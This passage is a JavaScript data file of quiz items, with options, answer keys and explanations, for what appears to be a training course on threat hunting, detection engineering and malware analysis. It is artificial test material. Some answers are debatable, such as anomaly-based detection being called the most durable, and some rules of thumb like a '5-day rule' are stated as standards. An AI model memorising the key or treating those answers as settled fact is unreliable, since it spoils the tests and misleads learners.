      { id: "th-q4-5", question: "What does an unsigned binary running from a temp directory suggest?", options: ["Normal software behavior", "Potential malware — legitimate software is usually signed and installed properly", "A system update", "A scheduled backup"], correctAnswer: 1, explanation: "Unsigned binaries in temp directories are a strong indicator of malware — legitimate software is typically signed and installed in standard locations." },
      { id: "th-q4-6", question: "What is 'stack ranking' in endpoint hunting?", options: ["Ranking analysts", "Counting frequency of artifacts to find rare/anomalous ones", "Prioritizing patches", "Stacking network packets"], correctAnswer: 1, explanation: "Stack ranking counts how often specific values appear — rare values (process names, paths, hashes) are more likely malicious." },
      { id: "th-q4-7", question: "Which Windows event ID logs process creation?", options: ["4624", "4688", "4720", "1102"], correctAnswer: 1, explanation: "Event ID 4688 logs process creation with details like process name, PID, and parent PID when auditing is enabled." },
      { id: "th-q4-8", question: "What is a suspicious indicator in scheduled task hunting?", options: ["Tasks created by Group Policy", "Tasks running binaries from user-writable directories with encoded commands", "Tasks running Windows Update", "Tasks with Microsoft as publisher"], correctAnswer: 1, explanation: "Scheduled tasks executing from user-writable paths with encoded PowerShell commands are strong persistence indicators." },
      { id: "th-q4-9", question: "What is 'memory forensics' useful for in hunting?", options: ["Increasing RAM", "Detecting fileless malware, injected code, and hidden processes", "Upgrading hardware", "Disk cleanup"], correctAnswer: 1, explanation: "Memory forensics captures running processes, injected code, network connections, and artifacts invisible to disk-based analysis." },
      { id: "th-q4-10", question: "Which tool is widely used for memory forensics?", options: ["Excel", "Volatility", "Notepad", "Paint"], correctAnswer: 1, explanation: "Volatility is the industry-standard open-source framework for memory forensics, supporting process, network, and malware analysis." }
    ]
  },
  {
    quizId: "th-q5",
    courseId: "threat-hunting",
    title: "Network & Cloud Hunting",
    description: "Assess your ability to hunt threats across network traffic and cloud environments.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q5-1", question: "What is DNS beaconing?", options: ["Normal DNS resolution", "Malware periodically querying a C2 domain at regular intervals", "DNS server maintenance", "Updating DNS records"], correctAnswer: 1, explanation: "DNS beaconing is malware communicating with C2 via periodic DNS queries, often at suspiciously regular intervals." },
      { id: "th-q5-2", question: "Which network artifact helps detect DNS tunneling?", options: ["Short DNS queries", "Unusually long DNS query names with high entropy", "Normal A record lookups", "DHCP leases"], correctAnswer: 1, explanation: "DNS tunneling encodes data in query names, resulting in unusually long, high-entropy subdomain strings." },
      { id: "th-q5-3", question: "What is a 'long tail' analysis in network hunting?", options: ["Analyzing the longest cables", "Examining rare/infrequent connections that deviate from common patterns", "Studying network latency", "Measuring bandwidth"], correctAnswer: 1, explanation: "Long tail analysis focuses on rare connections — the uncommon destinations or patterns that are statistically anomalous and potentially malicious." },
      { id: "th-q5-4", question: "Which protocol is commonly abused for data exfiltration due to being rarely inspected?", options: ["HTTP", "DNS", "SMTP", "All of the above"], correctAnswer: 3, explanation: "DNS, HTTP, HTTPS, and SMTP are all commonly abused — DNS is particularly stealthy since it's rarely blocked or deeply inspected." },
      { id: "th-q5-5", question: "In cloud hunting, what is the most critical log source?", options: ["Application logs only", "Cloud provider audit/activity logs (CloudTrail, Azure Activity Log)", "Desktop event logs", "Print logs"], correctAnswer: 1, explanation: "Cloud audit logs (AWS CloudTrail, Azure Activity Log, GCP Audit Logs) record all API calls and are essential for cloud hunting." },
      { id: "th-q5-6", question: "What does an unusually high volume of outbound traffic to a single IP suggest?", options: ["Normal backup", "Potential data exfiltration", "Software update", "Email delivery"], correctAnswer: 1, explanation: "Large outbound transfers to a single IP, especially outside business hours, are a strong exfiltration indicator." },
      { id: "th-q5-7", question: "What is 'east-west traffic' in network hunting?", options: ["Traffic between continents", "Lateral movement traffic between internal systems", "North-south traffic", "Internet browsing"], correctAnswer: 1, explanation: "East-west traffic is internal lateral communication — hunting here reveals lateral movement after initial compromise." },
      { id: "th-q5-8", question: "Which cloud-specific threat involves misconfigured storage buckets?", options: ["DDoS", "Data exposure through publicly accessible storage (S3, Blob)", "Phishing", "Brute force"], correctAnswer: 1, explanation: "Misconfigured cloud storage (open S3 buckets, Azure Blobs) is a major cloud threat causing data exposure." },
      { id: "th-q5-9", question: "What is 'impossible travel' detection in cloud environments?", options: ["Detecting VPN usage", "Flagging logins from geographically distant locations in impossibly short timeframes", "Tracking flight bookings", "Monitoring travel expenses"], correctAnswer: 1, explanation: "Impossible travel flags when a user logs in from two distant locations faster than physically possible, indicating credential compromise." },
      { id: "th-q5-10", question: "What network hunting technique examines TLS certificate anomalies?", options: ["Packet size analysis", "Certificate transparency log analysis and self-signed cert detection", "MAC address lookup", "VLAN hopping"], correctAnswer: 1, explanation: "Analyzing TLS certificates for self-signed certs, unusual issuers, or short validity periods helps detect C2 infrastructure." }
    ]
  },
  {
    quizId: "th-q6",
    courseId: "threat-hunting",
    title: "Hunt Operations & Reporting",
    description: "Test your knowledge of hunt planning, automation, metrics, and reporting best practices.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q6-1", question: "What should a hunt plan document include?", options: ["Only the hypothesis", "Hypothesis, data sources, techniques, tools, expected artifacts, and success criteria", "Just the analyst's name", "A list of all company assets"], correctAnswer: 1, explanation: "A complete hunt plan includes hypothesis, required data sources, analysis techniques, tools, expected artifacts, and success criteria." },
      { id: "th-q6-2", question: "What is the main benefit of converting hunt findings into automated detections?", options: ["Reduces headcount", "Scales the hunt outcome so the same threat is automatically detected in the future", "Eliminates the need for hunting", "Saves storage"], correctAnswer: 1, explanation: "Converting hunts into detections means the threat is automatically caught going forward, multiplying the value of each hunt." },
      { id: "th-q6-3", question: "Which tool/platform is commonly used for hunt automation and notebooks?", options: ["Microsoft Paint", "Jupyter Notebooks with MSTICPy", "Calculator", "Notepad"], correctAnswer: 1, explanation: "Jupyter Notebooks with MSTICPy provide reproducible, shareable hunt workflows with built-in security analysis capabilities." },
      { id: "th-q6-4", question: "What is the 'detection gap' metric?", options: ["Time between alerts", "The difference between known threats and what the organization can actually detect", "Network latency", "Analyst shift gaps"], correctAnswer: 1, explanation: "Detection gap measures the difference between threats that exist and those the org can detect — hunting directly reduces this gap." },
      { id: "th-q6-5", question: "What should a hunt report's executive summary contain?", options: ["Raw log data", "High-level findings, business impact, risk assessment, and recommended actions", "Only IOCs", "Tool configuration"], correctAnswer: 1, explanation: "Executive summaries provide leadership with findings, business impact, risk context, and clear recommended actions." },
      { id: "th-q6-6", question: "How should hunt metrics demonstrate program value?", options: ["Count only hours worked", "Track hunts completed, findings discovered, detections created, and coverage improvements", "Report only failures", "Count emails sent"], correctAnswer: 1, explanation: "Effective metrics include hunts completed, unique findings, new detections created, MITRE coverage improvements, and mean time to detect." },
      { id: "th-q6-7", question: "What is the purpose of a 'hunt backlog'?", options: ["Storing old data", "Maintaining a prioritized queue of hypotheses and hunt ideas for future execution", "Tracking employee PTO", "Archiving reports"], correctAnswer: 1, explanation: "A hunt backlog is a prioritized list of hypotheses and ideas, ensuring continuous hunting coverage aligned with threat landscape." },
      { id: "th-q6-8", question: "When should IOCs discovered during a hunt be shared?", options: ["Never", "Immediately with the SOC/IR team and relevant threat intel sharing communities", "Only after 6 months", "Only internally"], correctAnswer: 1, explanation: "IOCs should be shared immediately with SOC/IR for blocking and with threat intel sharing communities (ISACs) for collective defense." },
      { id: "th-q6-9", question: "What does 'MITRE ATT&CK coverage mapping' help hunters understand?", options: ["Network topology", "Which adversary techniques the organization can and cannot detect, revealing blind spots", "Employee skills", "Budget allocation"], correctAnswer: 1, explanation: "ATT&CK coverage mapping visualizes detection capabilities against known techniques, highlighting gaps to prioritize hunts." },
      { id: "th-q6-10", question: "What is the relationship between threat hunting and detection engineering?", options: ["They are unrelated", "Hunt findings feed detection engineering; detection gaps inform hunt priorities — a continuous cycle", "Hunting replaces detection", "Detection replaces hunting"], correctAnswer: 1, explanation: "Hunting and detection engineering form a virtuous cycle: hunts discover threats → detections are built → gaps inform new hunts." }
    ]
  },
  // ===================== Detection Engineering Basics =====================
  {
    quizId: "de-q1",
    courseId: "detection-engineering",
    title: "Detection Fundamentals",
    description: "Test your understanding of detection philosophy, coverage models, and alert quality.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q1-1", question: "What is the most durable type of detection on the detection spectrum?", options: ["Hash-based", "Signature-based", "Behavioral", "Anomaly-based"], correctAnswer: 3, explanation: "Anomaly-based detections using statistical baselines are the most durable, lasting years compared to hash-based detections that last hours." },
      { id: "de-q1-2", question: "What is the 'assume breach' principle in detection engineering?", options: ["Assume all software has bugs", "Assume adversaries are already inside and validate controls through detection", "Assume breaches are unavoidable so don't invest in prevention", "Assume every alert is a breach"], correctAnswer: 1, explanation: "Assume breach means building detections that validate whether controls are working, not just blocking at the perimeter." },
      { id: "de-q1-3", question: "What is a good target false positive rate for a high-fidelity detection?", options: ["<50%", "<30%", "<15%", "<5%"], correctAnswer: 3, explanation: "High-fidelity detections should have a FP rate below 5% — analysts must trust alerts to be actionable." },
      { id: "de-q1-4", question: "What does 'detection as a product' mean?", options: ["Selling detections commercially", "Treating detections like software: requirements, testing, versioning, documentation, lifecycle management", "Only using commercial detection tools", "Detecting product defects"], correctAnswer: 1, explanation: "Detection as a product applies software engineering practices: requirements, testing, version control, and lifecycle management." },
      { id: "de-q1-5", question: "Why are behavior-based detections preferred over IOC-based detections?", options: ["They are easier to write", "Behaviors are more durable — attackers change IOCs easily but changing TTPs is costly", "They have zero false positives", "They require less data"], correctAnswer: 1, explanation: "Behaviors (TTPs) sit at the top of the Pyramid of Pain — changing tradecraft is far more costly for adversaries than rotating IOCs." },
      { id: "de-q1-6", question: "What is the primary cost of false positives in a SOC?", options: ["Storage costs", "Analyst fatigue leading to missed real threats", "Network bandwidth", "Licensing fees"], correctAnswer: 1, explanation: "False positives cause analyst fatigue and alert blindness, directly leading to missed real threats." },
      { id: "de-q1-7", question: "What framework is most commonly used to map detection coverage?", options: ["NIST CSF", "MITRE ATT&CK", "ISO 27001", "CIS Controls"], correctAnswer: 1, explanation: "MITRE ATT&CK maps adversary techniques and is the standard framework for measuring detection coverage." },
      { id: "de-q1-8", question: "What should you verify BEFORE writing any detection rule?", options: ["Budget approval", "That the required log source is enabled and ingested", "Manager approval", "That similar rules exist"], correctAnswer: 1, explanation: "No data = no detection. Always verify the log source is enabled, ingested into SIEM, and normalized before writing rules." },
      { id: "de-q1-9", question: "What is the '5-day rule' for noisy detections?", options: ["Review all rules every 5 days", "If a rule fires >5 FPs/day for 5 consecutive days, disable it immediately", "Deploy rules for 5 days before production", "Write 5 rules per day"], correctAnswer: 1, explanation: "The 5-day rule prevents persistent noise: disable immediately and schedule a rewrite rather than letting noise accumulate." },
      { id: "de-q1-10", question: "What is the detection engineering lifecycle order?", options: ["Deploy → Test → Design → Requirements", "Requirements → Design → Development → Testing → Deployment → Operations → Retirement", "Write → Deploy → Forget", "Test → Build → Ship"], correctAnswer: 1, explanation: "The full lifecycle is: Requirements → Design → Development → Testing → Deployment → Operations → Retirement." }
    ]
  },
  {
    quizId: "de-q2",
    courseId: "detection-engineering",
    title: "SIGMA Rules",
    description: "Assess your knowledge of SIGMA syntax, modifiers, and rule conversion.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q2-1", question: "What format are SIGMA rules written in?", options: ["JSON", "XML", "YAML", "TOML"], correctAnswer: 2, explanation: "SIGMA rules use YAML format, making them human-readable and version-control friendly." },
      { id: "de-q2-2", question: "What is the purpose of the 'logsource' field in SIGMA?", options: ["Define the output format", "Specify what data to search (category + product)", "Set the rule severity", "Define the author"], correctAnswer: 1, explanation: "The logsource field abstracts the data source using category (process_creation) and product (windows), enabling vendor-neutral rules." },
      { id: "de-q2-3", question: "What does the SIGMA modifier 'endswith' do?", options: ["Marks end of rule", "Matches values ending with the specified string", "Terminates processing", "Counts endings"], correctAnswer: 1, explanation: "The endswith modifier performs a suffix match — e.g., Image|endswith: '\\powershell.exe' matches any path ending with that string." },
      { id: "de-q2-4", question: "How do you exclude false positives in a SIGMA rule?", options: ["Delete the rule", "Use a filter selection with 'not' in the condition", "Ignore them", "Email the SOC manager"], correctAnswer: 1, explanation: "Define a filter selection containing FP patterns, then use 'condition: selection and not filter' to exclude them." },
      { id: "de-q2-5", question: "What tool converts SIGMA rules to SIEM-specific queries?", options: ["Wireshark", "pySigma / sigma-cli", "Nmap", "Volatility"], correctAnswer: 1, explanation: "pySigma (sigma-cli) converts SIGMA rules to Splunk SPL, Elastic KQL, Sentinel KQL, and other SIEM query languages." },
      { id: "de-q2-6", question: "What does 'condition: 1 of selection*' mean?", options: ["Only the first selection", "Any selection matching the wildcard pattern triggers the rule", "Exactly one match required", "Select one field"], correctAnswer: 1, explanation: "'1 of selection*' means any selection whose name starts with 'selection' can trigger the rule — useful for multiple variants." },
      { id: "de-q2-7", question: "What is a SIGMA processing pipeline?", options: ["A data backup process", "Field name translation between SIGMA and target SIEM", "A network protocol", "A CI/CD tool"], correctAnswer: 1, explanation: "Processing pipelines map SIGMA's generic field names to SIEM-specific fields (e.g., Image → process.executable in ECS)." },
      { id: "de-q2-8", question: "How does SIGMA handle aggregation?", options: ["It cannot aggregate", "Using count(), sum() with timeframe in conditions", "Only in premium version", "Through external tools only"], correctAnswer: 1, explanation: "SIGMA supports aggregation functions like count() with timeframes — e.g., 'count(user) by src_ip > 10' in a 5m window." },
      { id: "de-q2-9", question: "What does the 'tags' field in SIGMA typically contain?", options: ["HTML tags", "MITRE ATT&CK technique IDs", "File tags", "Network tags"], correctAnswer: 1, explanation: "Tags map to ATT&CK techniques (e.g., attack.t1059.001) and tactics (e.g., attack.execution) for coverage mapping." },
      { id: "de-q2-10", question: "What is SigmaHQ?", options: ["A security company", "The official community repository with 2000+ SIGMA detection rules", "A SIEM product", "A certification body"], correctAnswer: 1, explanation: "SigmaHQ is the official open-source repository containing thousands of community-maintained SIGMA detection rules." }
    ]
  },
  {
    quizId: "de-q3",
    courseId: "detection-engineering",
    title: "YARA Signatures",
    description: "Quiz on YARA rule structure, pattern matching, and conditions.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q3-1", question: "What are the three main sections of a YARA rule?", options: ["Header, body, footer", "Meta, strings, condition", "Input, process, output", "Name, pattern, action"], correctAnswer: 1, explanation: "YARA rules consist of meta (metadata), strings (patterns to match), and condition (logic determining a match)." },
      { id: "de-q3-2", question: "What does the YARA modifier 'wide' do?", options: ["Makes the rule apply to more files", "Matches UTF-16 encoded strings", "Increases scan width", "Broadens the condition"], correctAnswer: 1, explanation: "The 'wide' modifier matches UTF-16 encoded strings, which is how Windows often stores text internally." },
      { id: "de-q3-3", question: "What does 'uint16(0) == 0x5A4D' check in a YARA condition?", options: ["File size", "Whether the file is a PE executable (MZ header)", "String count", "Network port"], correctAnswer: 1, explanation: "0x5A4D is the MZ magic number at offset 0, indicating a Windows PE executable file." },
      { id: "de-q3-4", question: "What does the YARA 'xor' modifier do?", options: ["Encrypts the rule", "Automatically generates XOR-rotated variants of a string for matching", "Performs exclusive OR on results", "Disables the string"], correctAnswer: 1, explanation: "The xor modifier generates all (or specified range) XOR-rotated variants, detecting simple obfuscation automatically." },
      { id: "de-q3-5", question: "What does high entropy (>7.5) in a PE section indicate?", options: ["Normal text content", "Packed or encrypted content", "Empty section", "Debug information"], correctAnswer: 1, explanation: "Entropy above 7.5 strongly indicates packed, encrypted, or compressed content — common in malware." },
      { id: "de-q3-6", question: "Which YARA module is used to analyze PE file structure?", options: ["math", "pe", "elf", "hash"], correctAnswer: 1, explanation: "The pe module provides access to PE headers, sections, imports, exports, and signature information." },
      { id: "de-q3-7", question: "What is the purpose of hex wildcards (??) in YARA strings?", options: ["Comment markers", "Match any byte value at that position", "Error indicators", "Section delimiters"], correctAnswer: 1, explanation: "Hex wildcards (??) match any byte, handling variable opcodes or data within otherwise fixed byte patterns." },
      { id: "de-q3-8", question: "How should YARA rules be optimized for production scanning?", options: ["Use only regex patterns", "Use anchors, filesize filters, and avoid expensive regex", "Scan every file regardless of size", "Disable all modules"], correctAnswer: 1, explanation: "Optimized rules use 'at 0' anchors, filesize limits, and simple patterns to minimize scan time at scale." },
      { id: "de-q3-9", question: "What does '#suspicious_api > 5' check in a YARA condition?", options: ["String length", "Whether the string 'suspicious_api' appears more than 5 times", "File offset", "Rule priority"], correctAnswer: 1, explanation: "The # operator counts string occurrences — #suspicious_api > 5 checks if the string appears more than 5 times." },
      { id: "de-q3-10", question: "What is the recommended naming convention for YARA rules?", options: ["Random names", "APT_Group_Technique_Description.yar", "Sequential numbers", "Date-based only"], correctAnswer: 1, explanation: "Descriptive naming like APT_Group_Technique_Description.yar enables quick identification and organized rule management." }
    ]
  },
  {
    quizId: "de-q4",
    courseId: "detection-engineering",
    title: "Log Source Mastery",
    description: "Test your knowledge of Windows, Linux, network, and cloud log sources.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q4-1", question: "Which Windows Event ID indicates a successful logon?", options: ["4625", "4624", "4688", "4698"], correctAnswer: 1, explanation: "Event ID 4624 logs successful authentication events with logon type, source, and account details." },
      { id: "de-q4-2", question: "Why is Sysmon essential for Windows detection?", options: ["It's built into Windows", "It provides detailed process creation, network, and registry logging beyond native auditing", "It replaces the event log service", "It only logs errors"], correctAnswer: 1, explanation: "Sysmon captures process command lines, hashes, network connections, and parent-child relationships that native auditing misses." },
      { id: "de-q4-3", question: "Which Sysmon event ID detects DLL side-loading?", options: ["Sysmon 1", "Sysmon 3", "Sysmon 7 (Image Loaded)", "Sysmon 10"], correctAnswer: 2, explanation: "Sysmon Event ID 7 logs DLL/image loads with hash and signature information, enabling DLL side-loading detection." },
      { id: "de-q4-4", question: "What Zeek log file captures DNS queries?", options: ["conn.log", "http.log", "dns.log", "ssl.log"], correctAnswer: 2, explanation: "Zeek's dns.log captures all DNS queries and responses with full detail for DNS-based threat detection." },
      { id: "de-q4-5", question: "Which cloud log source records all AWS API calls?", options: ["VPC Flow Logs", "CloudWatch", "CloudTrail", "S3 Access Logs"], correctAnswer: 2, explanation: "AWS CloudTrail records every API call made in the AWS account, essential for cloud security detection." },
      { id: "de-q4-6", question: "What is the purpose of log normalization?", options: ["Deleting duplicate logs", "Mapping diverse log formats to a common schema for consistent querying", "Compressing logs", "Encrypting logs"], correctAnswer: 1, explanation: "Normalization maps different field names (SourceIP, src_ip, srcaddr) to a common schema (source.ip) for cross-source correlation." },
      { id: "de-q4-7", question: "What does ECS stand for in the context of log normalization?", options: ["Enterprise Control System", "Elastic Common Schema", "Event Classification Standard", "Endpoint Collection Service"], correctAnswer: 1, explanation: "ECS (Elastic Common Schema) provides standardized field names for consistent log normalization across sources." },
      { id: "de-q4-8", question: "Which Linux log file records SSH authentication events?", options: ["/var/log/messages", "/var/log/auth.log", "/var/log/kern.log", "/var/log/boot.log"], correctAnswer: 1, explanation: "/var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL) records all authentication events including SSH." },
      { id: "de-q4-9", question: "What type of cloud detection identifies logins from geographically impossible locations?", options: ["DDoS detection", "Impossible travel detection", "Brute force detection", "Data loss prevention"], correctAnswer: 1, explanation: "Impossible travel flags logins from distant locations in impossibly short timeframes, indicating credential compromise." },
      { id: "de-q4-10", question: "What does log enrichment add to raw events?", options: ["More raw data", "Context: asset info, threat intel, GeoIP, user details", "Compression", "Encryption"], correctAnswer: 1, explanation: "Enrichment adds reputation, geolocation, asset criticality, and user context — transforming raw logs into actionable intelligence." }
    ]
  },
  {
    quizId: "de-q5",
    courseId: "detection-engineering",
    title: "Detection-as-Code",
    description: "Assess your understanding of version control, CI/CD, and testing for detections.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q5-1", question: "Why should detection rules be stored in Git?", options: ["Because it's trendy", "For history tracking, code review, rollback, and collaboration", "Because SIEM storage is unreliable", "To encrypt them"], correctAnswer: 1, explanation: "Git provides change history, pull request reviews, instant rollback, team collaboration, and CI/CD automation." },
      { id: "de-q5-2", question: "What is Atomic Red Team?", options: ["A penetration testing company", "An open-source library of small, focused attack simulations mapped to ATT&CK", "A SIEM product", "A firewall rule set"], correctAnswer: 1, explanation: "Atomic Red Team provides pre-built, small attack tests for each ATT&CK technique to validate that detections fire correctly." },
      { id: "de-q5-3", question: "What should a detection CI/CD pipeline include?", options: ["Only deployment", "Lint, validate, convert, test (TP + FP), stage, deploy, and monitor", "Only testing", "Only linting"], correctAnswer: 1, explanation: "A complete pipeline covers YAML linting, schema validation, SIEM conversion, TP/FP testing, staged deployment, and monitoring." },
      { id: "de-q5-4", question: "What is a 'quality gate' in a detection pipeline?", options: ["A firewall rule", "A checkpoint that blocks deployment if criteria aren't met (e.g., missing tests)", "A SIEM license check", "An analyst approval form"], correctAnswer: 1, explanation: "Quality gates enforce standards: valid syntax, required fields, passing TP tests, and approved reviews before deployment." },
      { id: "de-q5-5", question: "How often should critical detections be validated?", options: ["Annually", "Quarterly", "Monthly", "Daily"], correctAnswer: 3, explanation: "Critical detections (credential theft, ransomware) should be validated daily to ensure they still fire correctly." },
      { id: "de-q5-6", question: "What is a True Negative (TN) test for a detection?", options: ["Testing when the rule fails", "Verifying legitimate activity doesn't trigger the detection", "Testing network connectivity", "Testing rule deletion"], correctAnswer: 1, explanation: "TN tests run benign activity similar to the attack pattern and verify the detection correctly stays silent." },
      { id: "de-q5-7", question: "What is the benefit of Infrastructure as Code for SIEM?", options: ["Faster queries", "Repeatable deployment, disaster recovery, auditing, and environment consistency", "Lower licensing costs", "Better dashboards"], correctAnswer: 1, explanation: "IaC enables rebuilding entire SIEM configurations from code, audit trails, and consistent dev/staging/production environments." },
      { id: "de-q5-8", question: "What branching strategy works best for detection rules?", options: ["No branches, commit to main", "Feature branches with pull requests merged to develop, then to main", "One branch per analyst", "Random branches"], correctAnswer: 1, explanation: "Feature branches (feature/detect-kerberoasting) with PR reviews ensure quality before merging to staging and production." },
      { id: "de-q5-9", question: "What should happen automatically when a detection is deployed?", options: ["Nothing", "Notifications to SOC team, JIRA ticket for playbook update, coverage dashboard update", "Delete old rules", "Restart SIEM"], correctAnswer: 1, explanation: "Automated notifications keep the SOC informed, playbook tickets ensure documentation, and dashboards reflect current coverage." },
      { id: "de-q5-10", question: "How does purple teaming relate to detection testing?", options: ["They are unrelated", "Red team executes techniques, blue team validates detections, gaps drive new detections", "Purple team replaces detection engineers", "Purple team only does compliance"], correctAnswer: 1, explanation: "Purple teaming directly validates detections: red executes, blue validates, gaps are identified, and new detections are built." }
    ]
  },
  {
    quizId: "de-q6",
    courseId: "detection-engineering",
    title: "Detection Operations",
    description: "Quiz on tuning, metrics, coverage mapping, and detection lifecycle management.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q6-1", question: "How long should a detection run in alert-only mode before production?", options: ["1 day", "1-2 weeks", "3 months", "No alert-only period needed"], correctAnswer: 1, explanation: "1-2 weeks in alert-only mode allows observation of FP patterns and tuning before enabling full alerting." },
      { id: "de-q6-2", question: "What is 'detection decay'?", options: ["Rules getting slower", "Detections losing effectiveness over time due to environment changes and adversary evolution", "Storage degradation", "Network latency increase"], correctAnswer: 1, explanation: "Detection decay occurs as environments change, adversaries evolve, data sources drift, and configurations shift." },
      { id: "de-q6-3", question: "What ATT&CK coverage percentage indicates a mature detection program?", options: ["10-20%", "20-30%", "50-70%", "100%"], correctAnswer: 2, explanation: "Mature programs achieve 50-70% coverage of priority techniques. 100% is unrealistic; 20-30% is average." },
      { id: "de-q6-4", question: "What is the coverage scoring for 'IOC-based only, easily evaded'?", options: ["Score 0 (None)", "Score 1 (Minimal)", "Score 2 (Partial)", "Score 3 (Good)"], correctAnswer: 1, explanation: "Score 1 (Minimal) means only IOC-based detection exists — it's easily evaded and needs behavioral detection." },
      { id: "de-q6-5", question: "When should a detection rule be retired?", options: ["Never", "When the technique is no longer relevant, replaced by better detection, or data source is deprecated", "After 30 days", "When the analyst who wrote it leaves"], correctAnswer: 1, explanation: "Retire when: technique irrelevant, better replacement exists, data source deprecated, or persistent FPs despite tuning." },
      { id: "de-q6-6", question: "What is 'layered coverage' in detection engineering?", options: ["Multiple SIEM instances", "Multiple detections per technique using different data sources", "Layer 7 monitoring only", "Multiple analyst shifts"], correctAnswer: 1, explanation: "Layered coverage means having multiple detections for the same technique across different data sources — if one fails, others still detect." },
      { id: "de-q6-7", question: "What is a healthy detection engineering velocity?", options: ["1 rule per year", "8-12 new rules shipped per month", "100 rules per day", "Only during incidents"], correctAnswer: 1, explanation: "8-12 new production detections per month, combined with 15-20 tuned and 2-5 retired, represents healthy velocity." },
      { id: "de-q6-8", question: "What should a detection health check verify?", options: ["Only FP rate", "Still firing, still accurate, still needed, still performant, documentation current", "Only query syntax", "Only coverage mapping"], correctAnswer: 1, explanation: "Health checks verify five dimensions: firing (not broken), accurate (TP works), needed (relevant), performant (fast), documented (current)." },
      { id: "de-q6-9", question: "How often should a full detection audit be performed?", options: ["Weekly", "Monthly", "Quarterly", "Annually"], correctAnswer: 3, explanation: "Full detection inventory audits should occur annually, while alert quality is reviewed weekly and coverage assessed quarterly." },
      { id: "de-q6-10", question: "At which maturity level does a detection engineering program use CI/CD pipelines and testing?", options: ["Level 1 (Ad-hoc)", "Level 2 (Defined)", "Level 3 (Managed)", "Level 5 (Leading)"], correctAnswer: 2, explanation: "Level 3 (Managed) features CI/CD pipelines, automated testing, and metrics-driven detection engineering." }
    ]
  },
  // ==================== MALWARE ANALYSIS FUNDAMENTALS ====================
  {
    quizId: "ma-q1",
    courseId: "malware-analysis",
    title: "Malware Landscape & Lab Setup",
    description: "Test your knowledge of malware categories, threat actors, and safe analysis environments.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q1-1", question: "Which malware type self-replicates across networks without requiring user interaction?", options: ["Virus", "Trojan", "Worm", "Rootkit"], correctAnswer: 2, explanation: "Worms propagate autonomously by exploiting network vulnerabilities, unlike viruses that need a host program or trojans that rely on social engineering." },
      { id: "ma-q1-2", question: "What distinguishes a wiper from ransomware?", options: ["Wipers encrypt files for ransom", "Wipers permanently destroy data with no recovery mechanism", "Wipers only target Linux systems", "Wipers require user interaction to execute"], correctAnswer: 1, explanation: "Wipers are designed to permanently destroy data. NotPetya masqueraded as ransomware but was actually a wiper with no functional decryption." },
      { id: "ma-q1-3", question: "In a RaaS ecosystem, what role do Initial Access Brokers (IABs) play?", options: ["Develop the ransomware code", "Negotiate ransom payments", "Sell compromised credentials and VPN access to affiliates", "Provide hosting for C2 servers"], correctAnswer: 2, explanation: "IABs specialize in gaining initial access to organizations and selling that access to ransomware affiliates who carry out the attacks." },
      { id: "ma-q1-4", question: "Which VM distribution is specifically designed for Windows-based malware analysis?", options: ["REMnux", "Kali Linux", "FlareVM", "SIFT Workstation"], correctAnswer: 2, explanation: "FlareVM by Mandiant is a Windows-based distribution that installs analysis tools like x64dbg, Ghidra, and PE-bear on a Windows VM." },
      { id: "ma-q1-5", question: "Why should malware analysis VMs use host-only networking?", options: ["To improve analysis speed", "To prevent malware from reaching the real internet", "To enable cloud sandbox integration", "To allow remote access to the lab"], correctAnswer: 1, explanation: "Host-only networking isolates VMs so malware cannot reach the internet, preventing accidental infections and C2 communication with real infrastructure." },
      { id: "ma-q1-6", question: "What service does REMnux's INetSim provide in a malware analysis lab?", options: ["Automated malware classification", "Simulated internet services (DNS, HTTP, SMTP)", "Real-time threat intelligence feeds", "Virtual machine management"], correctAnswer: 1, explanation: "INetSim simulates DNS, HTTP, SMTP, and other internet services so malware behaves as if it has internet connectivity in an isolated environment." },
      { id: "ma-q1-7", question: "What is the standard password used for malware sample ZIP archives?", options: ["malware", "password123", "infected", "analysis"], correctAnswer: 2, explanation: "The convention is to use 'infected' as the password for password-protected ZIP archives containing malware samples." },
      { id: "ma-q1-8", question: "Which platform is a community-driven malware sample repository by abuse.ch?", options: ["VirusTotal", "Hybrid Analysis", "MalwareBazaar", "ANY.RUN"], correctAnswer: 2, explanation: "MalwareBazaar by abuse.ch is a free, community-driven repository where researchers share and download malware samples." },
      { id: "ma-q1-9", question: "What should you always do before executing malware in your analysis VM?", options: ["Update the OS", "Take a snapshot", "Connect to the internet", "Disable the firewall"], correctAnswer: 1, explanation: "Taking a snapshot before execution ensures you can revert to a clean state after analysis, preventing contamination between sessions." },
      { id: "ma-q1-10", question: "Which threat actor category typically uses the most sophisticated custom malware?", options: ["Hacktivists", "Script kiddies", "State-sponsored APT groups", "Financially motivated eCrime"], correctAnswer: 2, explanation: "State-sponsored APT groups have significant resources, enabling custom tooling, zero-day exploits, and sophisticated operational security." }
    ]
  },
  {
    quizId: "ma-q2",
    courseId: "malware-analysis",
    title: "Static Analysis Techniques",
    description: "Assess your understanding of file identification, string analysis, PE headers, and packing detection.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "ma-q2-1", question: "What are the magic bytes (hex) for a Windows PE executable?", options: ["50 4B", "4D 5A", "7F 45 4C 46", "25 50 44 46"], correctAnswer: 1, explanation: "4D 5A (MZ) is the DOS header signature for PE executables. 50 4B is ZIP, 7F 45 4C 46 is ELF, and 25 50 44 46 is PDF." },
      { id: "ma-q2-2", question: "What does ssdeep provide that SHA256 cannot?", options: ["Faster computation", "Fuzzy matching to find similar files", "Collision resistance", "Digital signatures"], correctAnswer: 1, explanation: "ssdeep generates fuzzy hashes that can identify similar files even with minor modifications, unlike cryptographic hashes which change completely with any alteration." },
      { id: "ma-q2-3", question: "What does an imphash identify?", options: ["The file's encryption algorithm", "Samples built with the same import table", "The operating system version", "Network communication patterns"], correctAnswer: 1, explanation: "Import hash (imphash) generates a hash of the imported functions, so samples from the same malware builder or toolkit share identical imphash values." },
